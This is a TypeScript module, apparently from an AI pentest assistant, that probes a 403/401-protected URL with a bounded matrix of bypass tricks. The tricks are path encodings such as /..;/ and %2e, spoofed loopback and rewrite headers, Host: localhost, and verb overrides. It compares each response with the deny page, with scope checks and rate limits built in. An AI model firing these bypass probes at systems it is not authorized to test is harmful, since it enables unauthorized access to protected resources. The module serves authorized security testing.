// bypass403.ts — 403/401 access-control bypass matrix (write/confirm tool
// `bypass403`). Given a URL that answers 403/401, try the classic
// alternate-path / header / verb-override tricks against the SAME origin and
// compare status+body against the baseline deny page. Host-based verdict: only
// a response that plausibly IS the real content (2xx with a DIFFERENT body
// than the deny page) counts as a bypass lead — never a bare status change.
// Every function is scope-gated via targetAllowed, bounded, low-rate, and
// reports HONEST signals — a lead is never claimed as a confirmed vulnerability.
// Pure helpers are exported for unit tests.
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";

const UA = "mia-assistant/1.0";

type ProbeResult = { status: number; body: string; headers: Record<string, string>; ms: number; error?: string };

function lowerHeaders(h: Headers): Record<string, string> {
  const out: Record<string, string> = {};
  h.forEach((v, k) => { out[k.toLowerCase()] = v; });
  return out;
}

async function fetchProbe(url: string, opts: { method?: string; headers?: Record<string, string>; body?: string; session?: string; rawUser?: unknown } = {}): Promise<ProbeResult> {
  const method = (opts.method || "GET").toUpperCase();
  const headers: Record<string, string> = { "User-Agent": UA };
  if (opts.session && opts.rawUser) {
    const s = sessionHeaders(opts.rawUser, opts.session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers.cookie = s.cookie;
    }
  }
  Object.assign(headers, opts.headers || {});
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method, headers, body: method === "GET" || method === "HEAD" ? undefined : opts.body, redirect: "manual", signal: AbortSignal.timeout(12_000) });
    const body = (await res.text()).slice(0, 12_000);
    return { status: res.status, body, headers: lowerHeaders(res.headers), ms: Date.now() - t0 };
  } catch (e) {
    return { status: 0, body: "", headers: {}, ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

// ── Pure helpers (unit-tested) ──────────────────────────────────────────────

export type BypassAttempt = {
  name: string;
  kind: "path" | "header" | "verb" | "body" | "host";
  url: string;
  method: string;
  headers?: Record<string, string>;
  body?: string;
};

function withPath(u: string, pathname: string): string {
  const c = new URL(u);
  c.pathname = pathname;
  return c.toString();
}

/** Build the classic 403-bypass matrix for one target URL. Pure. */
export function buildBypassMatrix(u: string): BypassAttempt[] {
  let p: URL;
  try { p = new URL(u); } catch { return []; }
  const path = p.pathname || "/";
  const norm = path.length > 1 && path.endsWith("/") ? path.slice(0, -1) : path;
  const bare = norm.replace(/^\/+/, "");
  const last = norm.slice(norm.lastIndexOf("/") + 1) || bare || "index";
  const out: BypassAttempt[] = [];
  // Path tricks (the classic PortSwigger "403 bypass" list). NOTE: fetch
  // normalizes dot-segments (/./ and /../) out of the URL before the request
  // leaves, so the server would never see them — those two are represented by
  // fetch-sendable equivalents (double slash, %2e, trailing dot/semicolon,
  // /..;/) instead.
  out.push({ name: "trailing slash", kind: "path", url: withPath(u, norm + "/"), method: "GET" });
  out.push({ name: "double slash //", kind: "path", url: withPath(u, "//" + bare), method: "GET" });
  out.push({ name: "dot-encoding %2e", kind: "path", url: withPath(u, norm.replace(/\/([^/]*)$/, "/%2e$1")), method: "GET" });
  out.push({ name: "trailing %2e", kind: "path", url: withPath(u, norm + "%2e"), method: "GET" });
  out.push({ name: "Tomcat /..;/", kind: "path", url: withPath(u, norm + "/..;/"), method: "GET" });
  out.push({ name: "trailing .", kind: "path", url: withPath(u, norm + "."), method: "GET" });
  out.push({ name: "trailing ;", kind: "path", url: withPath(u, norm + ";"), method: "GET" });
  out.push({ name: "parent re-entry /../" + last, kind: "path", url: withPath(u, norm + "/..%2f" + last), method: "GET" });
  // Header tricks (proxy/CDN original-url confusion).
  out.push({ name: "X-Original-URL", kind: "header", url: p.origin + "/", method: "GET", headers: { "x-original-url": path + (p.search || "") } });
  out.push({ name: "X-Rewrite-URL", kind: "header", url: p.origin + "/", method: "GET", headers: { "x-rewrite-url": path + (p.search || "") } });
  out.push({ name: "X-Forwarded-For loopback", kind: "header", url: u, method: "GET", headers: { "x-forwarded-for": "127.0.0.1" } });
  out.push({ name: "X-Originating-IP loopback", kind: "header", url: u, method: "GET", headers: { "x-originating-ip": "127.0.0.1" } });
  out.push({ name: "X-Remote-Addr loopback", kind: "header", url: u, method: "GET", headers: { "x-remote-addr": "127.0.0.1" } });
  out.push({ name: "X-Host localhost", kind: "header", url: u, method: "GET", headers: { "x-host": "localhost" } });
  // Verb overrides.
  out.push({ name: "POST instead of GET", kind: "verb", url: u, method: "POST", body: "" });
  out.push({ name: "HEAD", kind: "verb", url: u, method: "HEAD" });
  out.push({ name: "PATCH", kind: "verb", url: u, method: "PATCH", body: "" });
  out.push({ name: "X-HTTP-Method-Override: GET", kind: "verb", url: u, method: "POST", body: "", headers: { "x-http-method-override": "GET", "content-type": "application/x-www-form-urlencoded" } });
  // Body-based override (some routers read method/verb from a form body).
  out.push({ name: "urlencoded _method=GET", kind: "body", url: u, method: "POST", body: "_method=GET", headers: { "content-type": "application/x-www-form-urlencoded" } });
  // Host/Host-header variants (vhost-routing confusion).
  out.push({ name: "Host: localhost", kind: "host", url: u, method: "GET", headers: { host: "localhost" } });
  return out;
}

/** Digest of a deny page for same-body comparison. Pure. */
export function denyDigest(body: string): string {
  // Normalize volatile bits so SPA deny pages (nonces, ids, timestamps)
  // compare equal across requests.
  return body
    .replace(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi, "U")
    .replace(/\b\d{4,}\b/g, "N")
    .slice(0, 300);
}

/**
 * Host-based classification of one probe vs the baseline deny page. Pure.
 * Bypass LEAD only when: 2xx AND body differs from the deny page AND the body
 * does not merely echo our trick path back. Everything else stays honest.
 */
export function classifyBypass(base: ProbeResult, probe: ProbeResult, attempt: BypassAttempt): string[] {
  const out: string[] = [];
  if (probe.error || probe.status === 0) { out.push("gagal jaringan"); return out; }
  if (probe.status >= 300 && probe.status < 400) {
    const loc = probe.headers.location || "";
    out.push(loc && !loc.includes(new URL(attempt.url).host) ? `redirect eksternal: ${loc.slice(0, 120)}` : `redirect ${probe.status}`);
    return out;
  }
  if (probe.status < 200 || probe.status >= 300) return out; // still denied
  const baseDigest = denyDigest(base.body);
  const probeDigest = denyDigest(probe.body);
  if (probeDigest === baseDigest) { out.push(`200 tapi body SAMA dengan halaman deny (${probe.body.length}b) — bukan bypass`); return out; }
  // Echo guard: a WAF/app that just reflects the requested path is not content.
  const trickUrl = new URL(attempt.url);
  if (attempt.kind === "path" && probe.body.includes(trickUrl.pathname) && probe.body.length < base.body.length + 50) {
    out.push("200 tapi hanya memantulkan path trik — kemungkinan echo, bukan konten");
    return out;
  }
  out.push(`✅ BYPASS LEAD: ${probe.status}, ${probe.body.length}b (deny ${base.body.length}b) — body berbeda dari halaman deny`);
  return out;
}

// ── Runner ──────────────────────────────────────────────────────────────────

/**
 * 403/401 bypass prover. Baseline the URL first (it must actually answer
 * 403/401), then run the bounded matrix, then honestly classify. Bounded
 * (~20 attempts, politeDelay spacing). A lead is a LEAD: poc_verify before
 * finding_add.
 */
export async function bypass403(rawUser: unknown, opts: { url: string; session?: string }): Promise<string> {
  const u = (opts.url || "").trim();
  if (!/^https?:\/\//i.test(u)) return "Error: URL harus http(s).";
  if (!targetAllowed(u)) return "Error: SCOPE — bypass403 hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  await politeDelay();
  const base = await fetchProbe(u, { session: opts.session, rawUser });
  if (base.status !== 403 && base.status !== 401) {
    return `Error: baseline ${u} menjawab ${base.status || "error"} — bukan 403/401. Tool ini untuk URL yang DITOLAK akses.`;
  }
  recordHttp(rawUser, { method: "GET", url: u, status: base.status, bytes: base.body.length, ms: base.ms, at: new Date().toISOString() });

  const matrix = buildBypassMatrix(u).slice(0, 20);
  const hits: { name: string; signals: string[]; status: number; len: number }[] = [];
  let networkFail = 0;
  for (const a of matrix) {
    await politeDelay();
    const p = await fetchProbe(a.url, { method: a.method, headers: a.headers, body: a.body, session: opts.session, rawUser });
    recordHttp(rawUser, { method: a.method, url: a.url, status: p.status, bytes: p.body.length, ms: p.ms, at: new Date().toISOString() });
    const sig = classifyBypass(base, p, a);
    if (sig[0] === "gagal jaringan") { networkFail++; continue; }
    if (sig.some((s) => s.startsWith("✅"))) hits.push({ name: a.name, signals: sig, status: p.status, len: p.body.length });
  }

  const head = `🚪 BYPASS403 ${u} — baseline ${base.status}/${base.body.length}b, ${matrix.length} trik diuji${networkFail ? `, ${networkFail} gagal jaringan` : ""}.`;
  if (!hits.length) {
    return `${head}\nTidak ada bypass yang jelas dari matriks klasik (path/header/verb/host). Kontrol aksesnya nampak ditegakkan konsisten — coba manual: /..;/ versi lain, cache confusion, atau verb+routing spesifik framework.\n\nℹ️ Tidak ada temuan = bukan klaim keamanan.`;
  }
  const body = hits.map((h) => `• ${h.name} → ${h.status}/${h.len}b\n   ↳ ${h.signals.join("; ")}`).join("\n");
  return `${head}\n${body}\n\n⚠️ LEAD ≠ bukti. Bandingkan isi body dengan konten asli yang diharapkan, lalu poc_verify (deterministik) sebelum finding_add (CWE-862/863).`;
}
